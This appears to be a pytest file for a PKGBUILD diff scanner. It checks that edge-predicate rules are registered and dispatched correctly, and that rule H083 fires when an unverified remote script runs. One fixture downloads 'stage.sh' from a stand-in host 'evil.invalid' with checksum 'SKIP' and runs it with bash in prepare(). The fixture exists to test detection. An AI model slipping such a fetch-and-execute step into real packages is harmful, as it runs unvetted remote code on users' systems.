"""The edge engine's shared context and predicates."""

from pathlib import Path

from trustsight.analysis.edges import (
    EDGE_INSTANCES,
    GraphContext,
    build_context,
    run_edge_instances,
)
from trustsight.analysis.pipeline import scan_diff

ROOT = Path(__file__).resolve().parent.parent


def _diff(body: str) -> str:
    added = "".join(f"+{line}\n" for line in body.splitlines())
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _ids(body: str) -> set[str]:
    fact = scan_diff(_diff(body), package_name="demo")
    return {entry.rule_id for entry in fact.score_breakdown}


def test_edge_instances_register_h094():
    registered = {instance.rule_id: instance for instance in EDGE_INSTANCES}
    assert "H094" in registered
    assert registered["H094"].emitter is not None
    assert (ROOT / registered["H094"].doc).exists()
    for fixture in registered["H094"].fixtures:
        assert (ROOT / fixture).exists()


# The 14 traversal rules migrates to edge predicates.
_PHASE_3_IDS = {
    "H016", "H035", "H040", "H041", "H042", "H071", "H072",
    "H075", "H077", "H080", "H082", "H083", "H090", "H094",
}


def test_edge_instances_cover_every_phase_3_rule():
    registered = {instance.rule_id: instance for instance in EDGE_INSTANCES}
    assert _PHASE_3_IDS <= set(registered), sorted(_PHASE_3_IDS - set(registered))
    for rule_id in _PHASE_3_IDS:
        instance = registered[rule_id]
        assert (ROOT / instance.doc).exists(), rule_id
        assert instance.fixtures, rule_id
        for fixture in instance.fixtures:
            assert (ROOT / fixture).exists(), (rule_id, fixture)



def test_build_context_computes_the_shared_facts():
    ctx = build_context(_diff("build() {\n  ./x.sh\n}\n"), {})
    assert isinstance(ctx, GraphContext)
    assert ctx.lines
    assert ctx.scopes is not None


def test_h083_ignores_a_checksum_pinned_declared_script():
    """pkl-lsp: prepare() runs merge-lsp4j-metadata.py, a declared source
    pinned by a real sha512.  The pinned bytes are what the packager
    vetted, so executing the helper is packaging, not remote code."""
    body = (
        "source=(\"https://example.invalid/merge.py\" \"x.tar.gz\")\n"
        "sha512sums=('" + "5d41402abc4b2a76b9719d911017c592"
        "5d41402abc4b2a76b9719d911017c592"
        "5d41402abc4b2a76b9719d911017c592"
        "5d41402abc4b2a76b9719d911017c592" + "' '"
        + "4368f3a2b1c09d7e5a4b2310f8e6d9c0"
        "4368f3a2b1c09d7e5a4b2310f8e6d9c0"
        "4368f3a2b1c09d7e5a4b2310f8e6d9c0"
        "4368f3a2b1c09d7e5a4b2310f8e6d9c0" + "')\n"
        "prepare() {\n"
        "  python3 \"$srcdir/merge.py\"\n"
        "}\n"
    )
    assert "H083" not in _ids(body)


def test_h083_fires_on_a_skip_pinned_declared_script():
    body = (
        "source=(\"https://evil.invalid/stage.sh\")\n"
        "sha256sums=('SKIP')\n"
        "prepare() {\n"
        "  bash \"$srcdir/stage.sh\"\n"
        "}\n"
    )
    assert "H083" in _ids(body)


def test_unread_execution_predicate_fires_in_package_scope():
    assert "H094" in _ids("package() {\n  ./x.sh\n}\n")


def test_unread_execution_predicate_reports_w001_in_build_scope():
    assert "W001" in _ids("build() {\n  ./x.sh\n}\n")


def test_every_registered_emitter_is_dispatched():
    """No migration may leave a registered predicate silently unreachable."""
    from trustsight import categories
    from trustsight.analysis import edges

    for instance in EDGE_INSTANCES:
        assert instance.rule_id in categories.RULE_CATEGORIES, instance.rule_id

    called: list[str] = []

    def spy(ctx, add):
        called.append("spy")

    seen_diff = _diff("package() {\n  ./x.sh\n}\n")
    original = edges.EDGE_INSTANCES
    edges.EDGE_INSTANCES = tuple(
        edges.EdgeInstance("H094", "spy", "unread", None, None, (), "HIGH",
                           "docs/rules/fetch-and-execution.md",
                           ("tests/test_edges.py",), spy)
        for _ in range(3)
    )
    try:
        edges.run_edge_instances(build_context(seen_diff, {}), lambda *a, **k: None)
    finally:
        edges.EDGE_INSTANCES = original
    assert called == ["spy", "spy", "spy"]


def test_run_edge_instances_honours_only():
    ctx = build_context(_diff("package() {\n  ./x.sh\n}\n"), {})
    seen: list[str] = []

    def add(rule_id, *_args, **_kwargs):
        seen.append(rule_id)

    run_edge_instances(ctx, add, only=frozenset({"H094"}))
    assert seen == ["H094"]


def test_run_edge_instances_does_not_double_dispatch():
    ctx = build_context(_diff("package() {\n  ./x.sh\n}\n"), {})
    seen: list[str] = []

    def add(rule_id, *_args, **_kwargs):
        seen.append(rule_id)

    run_edge_instances(ctx, add)
    assert len(seen) == len(set(seen))
